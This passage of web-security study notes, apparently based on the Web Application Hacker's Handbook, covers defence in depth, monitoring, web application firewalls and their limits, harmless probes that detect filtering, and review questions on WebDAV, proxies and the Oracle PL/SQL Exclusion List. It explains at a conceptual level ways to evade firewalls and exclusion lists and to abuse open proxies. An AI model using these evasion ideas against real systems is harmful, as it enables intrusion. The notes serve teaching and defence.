Each layer has a different responsibility. The firewall restricts network reachability, the web server handles HTTP requests, the application enforces business rules, the database enforces data-access permissions, and the monitoring infrastructure helps detect suspicious activity. The objective is to prevent a single vulnerable component from becoming a gateway to everything else.

Suppose an application records security events in a database table. The web application's database account should have only the permissions it needs to perform its task. If it only needs to insert audit events, it should not automatically receive permission to delete existing records or alter the database schema. Conceptually:

```
Application account:

    INSERT audit events
    No unnecessary UPDATE permission
    No unnecessary DELETE permission
    No database-administrator privileges
```

This limits the damage an attacker can cause if the application is compromised. However, database permissions alone are not enough to guarantee audit-log integrity. If the compromised application account can insert arbitrary events, an attacker may still create misleading entries. For higher-assurance logging, forward events to a separately controlled logging system, restrict administrative access, and use append-only or tamper-resistant storage where appropriate. The principle is straightforward: *the component being monitored should not have unrestricted control over the evidence used to investigate its own compromise.*

*Apply strict network filtering!*

Network controls should restrict both incoming and outgoing traffic. Inbound rules determine who can reach the web server and which services they can access. Outbound rules determine which destinations the server can contact. For a public web server, it may be necessary to permit incoming HTTPS traffic while denying direct access to management interfaces and unrelated services.

Outbound restrictions are equally important. A compromised web server should not automatically be able to connect to every internal host, access arbitrary management interfaces, or establish unrestricted connections to the Internet. A useful defensive question is: *if an attacker gains code execution on this server, which other systems can the compromised process reach?*

The answer should be determined by explicit network policy, not by assuming that an internal network is trustworthy.

*Monitor for signs of compromise!*

Intrusion detection remains important because preventive controls can fail.  An intrusion detection system (IDS) may identify suspicious network activity, while host-based monitoring, endpoint detection and response (EDR), network detection and response (NDR), and centralized security information and event management (SIEM) systems can provide additional visibility. Relevant indicators may include:

- Unexpected outbound connections.

- Attempts to scan other systems on internal networks.

- Unusual DNS requests.

- Unexpected processes spawned by the web-server service.

- New or modified executable files in web directories.

- Changes to server configuration.

- Unexpected administrative logins.

- Unusual access to credentials or sensitive files.

- Abnormal HTTP request patterns.

- Attempts to disable logging or security controls.

For example, if a web-server process unexpectedly launches a command interpreter and then attempts to establish an outbound connection, that may indicate exploitation or post-compromise activity. However, context matters. Some legitimate applications launch child processes or contact external services. Effective monitoring must distinguish normal application behaviour from suspicious deviations.

An IDS also cannot guarantee that every compromise will be detected. Attackers may evade particular signatures, use encrypted channels, or operate in ways that resemble legitimate activity. The goal is to improve detection and response—not to assume that a monitoring product makes prevention unnecessary.

Detection is useful only if the organization can respond effectively. A practical response plan should establish how to:

- Validate an alert and determine whether a compromise has occurred.

- Isolate the affected host or restrict its connectivity.

- Preserve logs and other forensic evidence.

- Identify the initial access method and the scope of the compromise.

- Rotate potentially exposed credentials and secrets.

- Remove the attacker's access and remediate the underlying vulnerability.

- Restore services from trusted sources.

- Verify that the system is secure before returning it to production.

- Review the incident and improve the controls that failed.

Isolation should be performed carefully so that evidence is preserved where possible and essential services are not disrupted unnecessarily. The key point is that *defence in depth buys you options and time.* It can prevent an initial compromise from becoming a full network breach, help identify the incident sooner, and make recovery more manageable. The whole philosophy can be summarized like this:

```
Discover weaknesses
        |
        v
Understand the risk
        |
        v
Patch and harden
        |
        v
Limit privileges and connectivity
        |
        v
Monitor for suspicious behaviour
        |
        v
Respond and recover
        |
        v
Improve the defences
```

*A secure web server is not merely one that has no known vulnerabilities. It is one whose weaknesses are discovered and addressed promptly, whose unnecessary capabilities have been removed, and whose compromise would not automatically compromise the rest of the environment.*

Here is a compact checklist & summary you can use when assessing a server in your own lab or an authorized engagement:

1. **Discovery and research:**

- Identify exposed ports and services.

- Determine the web-server product and version where possible.

- Identify bundled servers, runtimes, libraries, and extensions.

- Consult vendor advisories and current vulnerability databases.

- Check whether relevant vulnerabilities are known to be exploited.

- Use suitable scanners to identify known weaknesses and misconfigurations.

- Manually validate significant findings.

- Document the evidence and the affected software versions.

2. **Hardening and patch management:**

- Confirm that the software is supported.

- Apply appropriate security updates.

- Disable unnecessary modules, handlers, methods, and services.

- Remove default applications, sample files, and debugging endpoints.

- Restrict access to administrative interfaces.

- Review file-system permissions and process privileges.

- Apply least privilege to application and database accounts.

- Restrict inbound and outbound network traffic.

- Follow a product-specific hardening baseline.

- Verify that temporary mitigations are removed or reviewed after patching.

3. **Monitoring and resilience:**

- Centralize relevant security logs.

- Monitor unexpected processes and outbound connections.

- Alert on suspicious administrative activity.

- Protect logs against unauthorized alteration.

- Maintain an incident-response plan.

- Test recovery procedures.

- Review whether a compromised web server could reach sensitive internal systems.

### Web Application Firewalls (WAFs):

Many web applications are protected by an additional security component positioned between the client and the application itself. This component may run directly on the application host, on a dedicated network appliance, or as a cloud-based service. These solutions are designed to inspect incoming traffic and identify requests that may indicate an attack. There are several related technologies worth distinguishing:

- **Web Application Firewall (WAF):** Inspects HTTP traffic and can block requests that match suspicious patterns or violate configured security policies.

- **Intrusion Detection System (IDS):** Monitors activity and generates alerts when suspicious behaviour is detected. It does not necessarily block the traffic.

- **Intrusion Prevention System (IPS):** Monitors traffic and can actively block or reject activity identified as malicious.

A WAF can be considered a specialized form of application-layer security control. Although these technologies share some detection techniques, they are not interchangeable. The general purpose of a WAF is to provide an additional layer of protection between an external client and the application. However, the presence of a WAF does not automatically make an application secure. In fact, organizations sometimes develop a false sense of security because they assume that installing an additional protective component somehow compensates for weaknesses in the application itself.

A WAF can certainly help block recognizable attacks, known malicious payloads, and suspicious request patterns. It may also provide useful protection against automated attacks and exploitation attempts targeting common vulnerabilities. Nevertheless, it cannot reliably compensate for poor application architecture, insecure business logic, broken authorization, or every possible implementation flaw.

Several characteristics of WAF implementations can limit their effectiveness.

1. **HTTP Parsing Differences:**

A WAF must interpret incoming HTTP requests before deciding whether they should be allowed through. However, the WAF and the application server may interpret certain aspects of a request differently. For example, a WAF may follow a particular interpretation of HTTP specifications, while the application server accepts additional variations or handles ambiguous requests differently. This creates opportunities for *HTTP request parsing discrepancies.* Consider a simplified request-processing pipeline:

```
Client
  |
  v
WAF
  |
  |  Inspects HTTP request
  |
  v
Reverse proxy
  |
  v
Application server
  |
  |  Interprets HTTP request
  |
  v
Application
```

If the WAF and the application server disagree about the structure or meaning of a request, the security control may inspect something different from what the application ultimately processes. This general class of weakness is closely related to the parser differentials and request-smuggling vulnerabilities discussed elsewhere in web security.

2. **Input Transformation and Canonicalization:**

An application server may transform user input after the request has passed through the WAF. Such transformations may include:

- URL decoding.

- Unicode normalization.

- Character-set conversion.

- HTML entity decoding.

- Removal or replacement of specific characters.

- Automatic escaping.

- Interpretation of serialized data.

A WAF may inspect the original representation of a value, while the application subsequently transforms it into something with a different meaning. This is particularly relevant to the canonicalization problems we have already encountered in our previous WAHH sections. For example:

```
Incoming representation
          |
          v
WAF inspection
          |
          v
Application-side decoding
          |
          v
Interpreted value
```

If these processing stages do not agree, the WAF may fail to recognize what the application eventually receives. The defensive lesson is that security controls should understand the transformations performed by the application and inspect data in a way that is consistent with the eventual interpretation.

3. **Signature-Based Detection:**

Many WAFs use signatures and predefined rules to identify recognizable attack patterns. For example, a rule might look for suspicious combinations of characters, parameters, or request structures associated with SQL injection, cross-site scripting, or directory traversal. This approach is useful, but it has limitations. A signature may recognize a familiar attack payload without understanding the underlying vulnerability or the actual impact of exploiting it. Consider a hypothetical application vulnerable to arbitrary file retrieval.

A WAF might recognize a request attempting to retrieve a commonly targeted system file, while failing to recognize an attempt to retrieve a different sensitive file. The important distinction is: ***the vulnerability concerns unauthorized file access, not merely the presence of a particular filename in an HTTP request.***

A rule that recognizes only familiar filenames is therefore addressing a narrow collection of known examples rather than the underlying security problem. This illustrates why signature-based protection should be combined with proper authorization, secure file-handling logic, and restrictive filesystem permissions.

#### Vulnerabilities That WAFs Cannot Reliably Prevent:

Some vulnerabilities are particularly difficult for a WAF to identify because their exploitation depends on application-specific behaviour.

**Business Logic Vulnerabilities:**

A WAF generally cannot understand whether an application is implementing its business rules correctly. Imagine an online store that allows a customer to apply a discount multiple times when the business rules permit only one application. The HTTP request may be perfectly valid, and the parameters may contain nothing suspicious. The vulnerability exists because the application fails to enforce its intended business logic. Other examples include:

- Manipulating transaction amounts.

- Abusing password-reset workflows.

- Bypassing purchase limits.

- Reusing promotional codes.

- Exploiting inconsistent authorization checks.

- Performing actions in an unintended order.

These weaknesses require an understanding of the application's intended behaviour. A generic WAF cannot reliably infer those requirements.

**DOM-Based Cross-Site Scripting:**

Traditional server-side WAFs inspect requests travelling through the server-side infrastructure. However, DOM-based XSS can occur entirely within the browser. For example, vulnerable JavaScript might take information from a URL fragment and insert it into the document using an unsafe DOM operation. The fragment is not normally transmitted to the server as part of an HTTP request. Consequently, a conventional server-side WAF cannot inspect that fragment or reliably identify the vulnerable client-side operation.

Some WAF products offer additional browser-side protections, and server-side rules may catch certain XSS-related inputs. Nevertheless, these controls do not replace secure JavaScript and DOM handling. The correct defence is to use safe DOM APIs, avoid dangerous HTML insertion patterns, and apply appropriate output handling.

#### Detecting the Presence of a WAF:

Before assessing an application's security controls, it is useful to establish whether a WAF or another filtering mechanism is present. The following techniques are intended for authorized testing. It is important to remember that *observing a blocked request does not automatically prove that a WAF is responsible.*

The application itself, a reverse proxy, an API gateway, an authentication layer, or another security component may be responsible for rejecting the request. The objective is to collect enough evidence to identify where the filtering occurs.

1. **Submit a Controlled Test Parameter:**

Start by identifying an application parameter whose value is reflected in the server response. For example, imagine an application with a search function:

```
GET /search?q=network HTTP/1.1
Host: lab.example
```

The application might return:

```
Search results for: network
```

Now submit a harmless, uniquely identifiable test value:

```
GET /search?q=waf_probe_2026_A17 HTTP/1.1
Host: lab.example
```

If the application reflects the supplied value, the response might contain:

```
Search results for: waf_probe_2026_A17
```

This establishes a useful baseline. Next, use harmless test characters to observe how the application and its protective components handle unusual input:

```
waf_probe_2026_A17

waf-probe-"quoted-value"

waf-probe-<marker>
```

These are diagnostic markers, not exploit payloads. Observe whether the application:

- Accepts the input.

- Rejects it.

- Removes certain characters.

- Encodes or transforms the value.

- Returns a different HTTP status code.

- Produces a challenge page.

- Generates an unusual response or error.

If an otherwise harmless input is rejected before reaching the application, an intermediary filtering mechanism may be responsible. However, confirm this using additional evidence rather than immediately concluding that a WAF is present.

2. **Compare Different Input Representations:**

If an application reflects a parameter in its response, it can be useful to examine how different representations of harmless input are handled. For example, compare:

```
waf_probe_2026_A17
```

with:

```
waf%5Fprobe%5F2026%5FA17
```

The second example uses URL encoding for the underscore characters. Observe whether the application returns the same value, a decoded representation, or a different result. This can help identify where decoding and normalization take place. A useful testing table might look like this:

```
Test:						What to observe:
Ordinary text			->	Baseline application behaviour
URL-encoded characters	->	URL decoding behaviour
Quotation marks			->	Input handling and output encoding
Angle brackets			->	HTML-related filtering or encoding
Whitespace variations	->	Input normalization
Repeated parameters		->	Parameter interpretation
Different content types	->	Request parsing behaviour
```

The objective is not to assume that every unusual response represents a WAF rule, but to understand the complete request-processing pipeline.

3. **Repeat Tests Against Known Application Parameters:**

Once you have identified how the application handles a harmless test parameter, repeat the same observations against other parameters. For example, an application might expose:

```
/search?q=...
/profile?name=...
/products?category=...
```

Different endpoints may be processed by different application components. One endpoint may be protected by a filtering rule while another may use a completely different request-processing path. Compare the results carefully. A WAF may apply different policies to different URLs, HTTP methods, content types, or application paths.

#### Testing Different Locations for User Input:

One of the most important aspects of web application testing is understanding that user input can enter an application through several different parts of an HTTP request. A WAF may inspect some locations differently from others. For example, consider the following request:

```
GET /search?q=waf_probe_2026_A17 HTTP/1.1
Host: lab.example
```

Here, the parameter is supplied through the URL query string. The same logical value could also be supplied through the body of a POST request:

```
POST /search HTTP/1.1
Host: lab.example
Content-Type: application/x-www-form-urlencoded

q=waf_probe_2026_A17
```

These requests are not necessarily processed identically. The application may use different parsing routines for query-string parameters and POST-body parameters. A WAF may also have different inspection rules or limitations depending on the request location.

1. **Query-string parameters:**

These are supplied directly in the URL:

```
/search?q=example
```

They are commonly used for searches, filters, pagination, and other operations where the supplied values are intended to be visible in the URL.

2. **POST-body parameters:**

These are supplied in the request body:

```
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

q=example
```

They are commonly used for form submissions and operations that modify application state.

3. **Cookies:**

Cookies are another way of transmitting user-controlled values:

```
GET /profile HTTP/1.1
Host: lab.example
Cookie: preference=waf_probe_2026_A17
```

Some applications use cookies for preferences, session management, or other application-specific state. A cookie value should not automatically be considered trustworthy simply because it is supplied through a browser-managed mechanism.

#### ASP.NET and ```Request.Params```:

The original WAHH text specifically mentions ASP.NET's ```Request.Params``` collection. This deserves a little clarification.

In classic ASP.NET (```System.Web```), the ```HttpRequest.Params``` property provides a combined collection containing values from several request sources:

- ```QueryString```

- ```Form```

- ```Cookies```

- ```ServerVariables```

For example:

```
string value = Request.Params["foo"];
```

This retrieves the value associated with ```foo``` from the combined collection. The important distinction is that ```Request.Params``` does not represent only query-string and POST-body parameters. It combines several sources, including cookies.

Consequently, an application that uses ```Request.Params``` without considering the origin of a value may introduce ambiguity when the same parameter name appears in multiple request locations. Microsoft documents this behaviour in its *HttpRequest documentation.*

A more explicit implementation would retrieve values from the intended source:

```
string queryValue = Request.QueryString["foo"];

string formValue = Request.Form["foo"];

string cookieValue = Request.Cookies["foo"]?.Value;
```

This makes the source of the input clearer and reduces ambiguity.

**Things worth remembering:**

- Query-string parameters and POST-body parameters are separate collections.

- Cookies are another independent source of user-controlled input.

- ```Request.Params``` combines multiple sources.

- Applications should not assume that identical parameter names from different locations are interchangeable.

- WAFs and application frameworks may interpret duplicate or conflicting parameters differently.

#### Other Ways of Introducing User Input:

A web application may accept input through considerably more than query strings and ordinary HTML forms. During an assessment, investigate all the locations through which user-controlled data can enter the application. Examples include:

- HTTP headers.

- Cookies.

- URL path segments.

- URL fragments processed by client-side JavaScript.

- JSON request bodies.

- XML request bodies.

- Multipart form uploads.

- File metadata.

- Serialized objects.

- WebSocket messages.

- API parameters.

- Custom protocol or application-specific data formats.

The important question is not simply whether a parameter exists. Precisely, it is *where the parameter enters the application, how it is parsed, and which component ultimately consumes it.* For example, a JSON API might accept:

```
POST /api/search HTTP/1.1
Host: lab.example
Content-Type: application/json

{
    "query": "waf_probe_2026_A17"
}
```

A WAF may inspect JSON bodies differently from URL-encoded forms. Similarly, multipart requests have their own structure and parsing requirements. When testing these formats, use controlled values and compare the WAF's response with the application's own behaviour.

#### Parameter Pollution and Concatenation:

Another interesting subject mentioned by WAHH is *HTTP Parameter Pollution (HPP).* HPP occurs when an HTTP request contains multiple parameters with the same name. For example:

```
GET /search?q=first&q=second HTTP/1.1
Host: lab.example
```

Different frameworks and application components may handle duplicate parameters differently. Depending on the implementation, the application might:

- Use only the first value.

- Use only the last value.

- Combine multiple values.

- Reject the request.

- Interpret the values differently in different processing layers.

This can become security-relevant when a WAF and an application disagree about which value is authoritative. For example, imagine that a filtering component examines the first occurrence of a parameter, while the application uses the last occurrence. The two components may effectively make security decisions about different values. This is another example of a parser differential.

**Concatenating values:**

Some applications also construct a final value by combining multiple input parameters. Conceptually:

```
Parameter A: "waf_probe_"
Parameter B: "2026_A17"

Application combines them:

"waf_probe_2026_A17"
```

The resulting value may be different from what an intermediary sees when examining each parameter independently. This is particularly relevant when application code performs its own string concatenation or normalization. However, do not assume that duplicate parameters are automatically concatenated. That behaviour depends on the application framework and the code consuming the values.

The same applies to ASP.NET: ```Request.Params``` combines collections, but the precise behaviour of duplicate values and their interpretation must be tested in the relevant application context.

#### Modern Web Application Firewalls:

The original WAHH chapter discusses WAFs largely as signature-based filtering components. Modern WAF solutions have evolved considerably. They can combine managed detection rules, custom policies, rate limiting, bot detection, behavioural analysis, and integration with other security services. Let's look at a few relevant examples.

1. **Cloudflare WAF:**

Cloudflare is a particularly accessible example of a modern cloud-based WAF. Instead of necessarily running on the same host as the application, Cloudflare can sit in front of an origin server and inspect incoming HTTP traffic before forwarding permitted requests. A simplified architecture looks like this:

```
             Internet
                |
                v
       +------------------+
       | Cloudflare edge  |
       |                  |
       | WAF rules        |
       | Rate limiting    |
       | Bot protection   |
       | DDoS protection  |
       +------------------+
                |
                v
       +------------------+
       | Origin server    |
       |                  |
       | Web server       |
       | Application      |
       +------------------+
                |
                v
             Database
```

Cloudflare offers several relevant security features:

- *Managed Rules:* Preconfigured rulesets designed to identify common attacks.

- *Custom Rules:* Policies defined by the administrator to match particular request characteristics.

- *Rate Limiting:* Restricts excessive requests, for example against login or API endpoints.

- *Bot Protection:* Helps identify and manage automated traffic.

- *DDoS Protection:* Provides protection against certain denial-of-service attacks.

- *Security Analytics:* Provides visibility into detected and mitigated traffic.

Cloudflare also offers an implementation of the OWASP Core Rule Set. One particularly useful aspect is that administrators can configure different actions depending on the situation. For example, a suspicious request might be:

- Logged for further investigation.

- Blocked outright.

- Presented with a managed challenge.

- Allowed to continue.

The appropriate action depends on the application's requirements and the confidence that the request is malicious. Cloudflare's rules also execute in defined phases, meaning the order of security features matters. A terminating action can prevent later rules from being evaluated.

*Important limitation:* Cloudflare does not automatically secure the application behind it. If the origin server remains directly accessible from the Internet, an attacker may be able to bypass the Cloudflare proxy and communicate with the origin directly. A properly configured deployment should restrict origin access to the intended proxy infrastructure and use suitable origin authentication and encryption.

Even when correctly deployed, Cloudflare cannot reliably fix application-level authorization flaws, business logic errors, or vulnerable client-side JavaScript.

2. **ModSecurity and OWASP Core Rule Set:**

The *OWASP Core Rule Set (CRS)* is a collection of generic detection rules designed for compatible WAF engines, including ModSecurity. It aims to detect common web-application attack categories such as:

- SQL injection.

- Cross-site scripting.

- Local file inclusion.

- Remote file inclusion.

- Protocol violations.

- Other suspicious request patterns.

Unlike a standalone WAF product, CRS is primarily a ruleset that operates with a compatible WAF engine. This distinction is important:

```
WAF engine
    |
    v
OWASP Core Rule Set
    |
    v
Inspect HTTP requests
    |
    v
Detect suspicious patterns
    |
    v
Log, block, or otherwise handle request
```

The ruleset is designed to provide broad protection, but false positives remain possible. Legitimate application traffic may occasionally trigger a rule, requiring administrators to investigate and tune the configuration. The CRS project explicitly describes itself as a generic detection layer intended to complement application security rather than replace it.

3. **Other modern solutions:**

- *AWS WAF* — a managed WAF integrated with AWS infrastructure.

- *Azure Web Application Firewall* — WAF capabilities integrated with supported Azure networking services.

- *F5 BIG-IP Advanced WAF* — an enterprise-oriented application security solution.

- *Fortinet FortiWeb* — a WAF product designed to protect web applications and APIs.

- *Coraza* — an open-source WAF engine compatible with the ModSecurity rule ecosystem.

The important thing is not memorizing every commercial product, but understanding the capabilities they provide and, more importantly, their limitations. A WAF is one component of a broader security architecture, not a replacement for secure development, patch management, authentication, authorization, or proper server configuration.

#### How to Assess Whether a WAF Actually Helps?

The presence of a WAF is not proof that it is configured correctly or that it protects the application effectively. A proper assessment should examine both the WAF and the application behind it. For an authorized assessment, consider the following questions:

- is the application actually routed through the WAF?

- can the origin server be accessed directly?

- which HTTP methods and content types are inspected?

- are query strings, POST bodies, cookies, and relevant headers covered?

- how does the WAF handle URL decoding and character normalization?

- does it inspect JSON, XML, and multipart requests appropriately?

- are there different policies for different application paths?

- are suspicious requests logged?

- are false positives monitored and investigated?

- are the rules regularly updated?

- have application-specific authorization and business logic been tested independently?

Where possible, compare the WAF's logs with the origin server's logs. This can help establish whether a request was blocked at the edge, rejected by the application, or transformed before reaching the application. The current *OWASP Web Security Testing Guide* provides a useful methodology for examining application security controls, including input validation, configuration, authorization, and business logic.

#### Summary: Web Application Firewalls :)

A WAF is an additional security layer that inspects HTTP traffic and attempts to identify malicious or suspicious requests before they reach an application. Although modern WAFs can provide valuable protection, their effectiveness depends on the quality of their rules, their configuration, their visibility into the request-processing pipeline, and their ability to interpret traffic consistently with the application.

The most important limitations discussed in this section are:

- **Parsing differences:** The WAF and application server may interpret the same HTTP request differently.

- **Canonicalization differences:** The application may decode or transform input after the WAF has inspected it.

- **Signature dependence:** A WAF may recognize familiar payloads without understanding the underlying vulnerability.

- **Business logic:** Generic filtering cannot reliably determine whether an application is implementing its business rules correctly.

- **Client-side vulnerabilities:** Server-side WAFs cannot reliably inspect behaviour that occurs entirely inside the browser.

- **Incomplete coverage:** Different request locations, content types, endpoints, and processing paths may receive different protection.

Modern solutions such as Cloudflare WAF, AWS WAF, ModSecurity with OWASP CRS, and Azure WAF offer considerably more sophisticated capabilities than the simple signature filters described in older security literature. Nevertheless, the fundamental limitations remain!

Overall, a WAF is useful, sometimes extremely useful, but it is not a magical security shield. It can help identify and block known attack patterns, reduce automated exploitation attempts, and provide an additional opportunity to detect suspicious activity. But it cannot reliably understand every application-specific vulnerability, and it cannot compensate for fundamentally insecure application design.

The most important lesson is this: ***a WAF should protect a properly secured application, not serve as a substitute for securing one.*** And perhaps the most interesting connection to our previous WAHH chapters and cookbooks is that WAF bypasses frequently involve the same underlying problem we have encountered repeatedly:

```
One component interprets the input one way.

Another component interprets it differently.

The attacker takes advantage of the disagreement.
```

Whether we are discussing Oracle PL/SQL, IIS path traversal, HTTP request parsing, parameter pollution, or modern WAFs, the underlying lesson is remarkably consistent. Security depends not only on what data enters a system, but also on how every component along the processing chain interprets that data.

### Chapter Review With Questions! :)

1. **Under what circumstances does a web server display a directory listing?**

A web server may display a directory listing when a client requests a directory that does not contain a recognized default index document (such as ```index.html```, ```index.php```, or ```default.aspx```) and directory browsing is enabled in the server configuration. This behaviour is usually controlled by a configuration directive or feature that determines whether the server should:

- Serve a default document.

- Return an access-denied or not-found response.

- Generate a listing of the directory's contents.

For example, Apache HTTP Server uses the ```Options Indexes``` directive to enable directory indexing, whereas IIS provides a Directory Browsing feature that can be enabled or disabled. Directory listings are not inherently vulnerabilities. They become a security issue when they expose files or directories that were never intended to be publicly accessible. Potentially exposed information includes:

- Backup files and old application versions.

- Configuration files and database dumps.

- Source code, logs, and temporary files.

- Internal documentation and deployment artifacts.

- Sensitive files accidentally placed beneath the web root.

Directory listing is usually a configuration issue, but the real risk depends on what the server exposes. Disabling directory browsing is sensible, but it does not replace proper access controls or keeping sensitive files outside the web root.

2. **What are WebDAV methods used for, and why might they be dangerous?**

WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP that allows clients to manage resources on a remote web server. In addition to ordinary HTTP methods such as ```GET```, ```POST```, and ```HEAD```, WebDAV introduces methods that support remote file management and collaboration. Some important examples:

- ```PROPFIND```: Retrieves properties and metadata about resources.

- ```PROPPATCH```: Modifies properties associated with resources.

- ```PUT```: Creates or replaces a resource.

- ```DELETE```: Removes a resource.

- ```COPY```: Copies a resource.

- ```MOVE```: Moves or renames a resource.

- ```MKCOL```: Creates a collection (typically a directory).

- ```LOCK```: Places a lock on a resource.

- ```UNLOCK```: Removes a lock.

Also, ```PROPFIND``` can reveal useful information about the server's directory structure, resource names, properties, and potentially other metadata. This can help an attacker map the application's exposed resources. However, the more dangerous methods are often those that allow modification of server resources. For example, if an unauthenticated or insufficiently restricted user can issue ```PUT```, they might be able to upload a file to a location where the web server can subsequently serve or execute it. Likewise, an exposed ```DELETE``` method could allow unauthorized removal of resources.

The important distinction is that *enabling WebDAV does not automatically make a server vulnerable.* The danger depends on which methods are enabled, how authentication and authorization are enforced, and which directories are accessible. ```PROPFIND``` can help with reconnaissance, but methods such as ```PUT```, ```DELETE```, ```COPY```, and ```MOVE``` can have much more direct consequences. Always investigate the entire WebDAV configuration rather than focusing on a single method.

3. **How can you exploit a web server that is configured to act as a web proxy?**

The primary opportunity is often the server's ability to make requests on behalf of the client. A web proxy forwards requests between clients and other servers. Depending on its configuration, it may act as:

- A *forward proxy,* allowing clients to access external resources through it.

- A *reverse proxy,* accepting incoming requests and forwarding them to backend servers.

A misconfigured forward proxy can potentially be abused to access resources that should not be publicly reachable. For example, an attacker might attempt to make the proxy request:

- Internal network services.

- Administrative interfaces.

- Services listening on loopback addresses.

- Resources on systems that are otherwise inaccessible from the attacker's network.

This is closely related to Server-Side Request Forgery (SSRF), although the two are not identical. A misconfigured proxy can provide an attacker with a convenient mechanism for making server-side requests, while SSRF describes a broader class of vulnerabilities in which an application can be induced to make unintended requests.

Also, proxy behaviour can depend on how it parses and normalizes URLs, hostnames, ports, paths, and encoded characters. For example, differences between the proxy's interpretation of a request and the backend server's interpretation may produce unexpected routing or filtering behaviour. A reverse proxy introduces other potential concerns, including:

- Improperly restricted access to backend services.

- Trusting client-supplied forwarding headers.

- Incorrect handling of the ```Host``` header.

- Authentication or access-control inconsistencies between the proxy and backend.

A proxy is not merely a filtering mechanism, but a network intermediary capable of making requests on behalf of someone else. If its access restrictions are inadequate, it can become a bridge into otherwise inaccessible systems.

4. **What is the Oracle PL/SQL Exclusion List, and how can it be bypassed?**

Oracle Application Server historically provided a PL/SQL Gateway that allowed web requests to invoke stored procedures inside an Oracle database. The gateway used an Exclusion List to restrict access to certain database packages and procedures. The intention was to prevent potentially dangerous functionality from being invoked directly through HTTP requests. In simple terms, the Exclusion List acted as a textual blacklist.

The problem was that blacklist-based security controls are only as effective as their ability to recognize every possible representation of the input they are supposed to restrict. Depending on the implementation and configuration, attackers could attempt to circumvent the restrictions through techniques such as:

- Using alternative whitespace characters.

- Exploiting differences in character encoding and conversion.

- Manipulating quoting and other syntactic elements.

- Taking advantage of parsing differences between the gateway and the database.

- Using PL/SQL language constructs, such as labels and ```GOTO```, to alter how a blocked procedure reference was reached.

The underlying problem was that the gateway's filtering logic and the database's PL/SQL parser did not necessarily interpret the same input in the same way. This could potentially allow access to procedures that the Exclusion List was intended to block. The broader lesson is not specific to Oracle: *security controls based on textual blacklists are fragile when they operate on input that will later be interpreted by a more complex parser.*

A better approach is to use explicit allowlists, restrict the procedures exposed through the gateway, and enforce authorization at the database/application boundary. A blacklist tries to enumerate what must not be allowed. An allowlist defines precisely what is permitted. The latter is generally much easier to reason about and maintain.

5. **If a web server allows access to its functionality over both HTTP and HTTPS, are there any advantages to using one protocol over the other when probing for vulnerabilities?**

We are generally investigating the server's implementation, configuration, and application logic rather than attempting to exploit HTTP or TLS themselves. However, HTTP and HTTPS are not necessarily equivalent from a testing perspective.

HTTPS provides encryption and integrity protection through TLS, whereas ordinary HTTP does not. But the protocol used to access the application can also affect which components process the request. For example:

- HTTP and HTTPS may be handled by different virtual hosts or listener configurations.

- HTTPS may terminate at a reverse proxy or load balancer before traffic reaches the application server.

- Different security rules, authentication requirements, or rewrite rules may apply to each endpoint.

- Redirects from HTTP to HTTPS may change how requests are processed.

- TLS configuration and certificate validation introduce additional areas to investigate.

A particularly important consideration is whether HTTP and HTTPS ultimately reach the same application instance. Let's imagine the following architecture:

```
                  Client
                    |
             +------+------+
             |             |
           HTTP          HTTPS
             |             |
        Web Server    Reverse Proxy
                           |
                     Application
                           |
                        Database
```

In this example, HTTP and HTTPS do not necessarily follow the same processing path. The HTTP endpoint might expose functionality or behave differently from the HTTPS endpoint. Conversely, the HTTPS reverse proxy might introduce its own filtering, authentication, or request-normalization behaviour. Therefore, when both protocols are available, it is worth comparing their behaviour using equivalent requests. Pay attention to:

- HTTP response codes.

- Redirects and response headers.

- Authentication and session handling.

- Available HTTP methods.

- Differences in input validation.

- Virtual-host and routing behaviour.

- Whether one endpoint exposes functionality absent from the other.

One final distinction: HTTPS does not inherently make an application more secure against server-side vulnerabilities. It protects communication in transit; it does not repair insecure application logic, incorrect authorization, or vulnerable server-side components. Test both HTTP and HTTPS when both are exposed. The underlying application may be the same, but the infrastructure and request-processing paths can differ considerably.
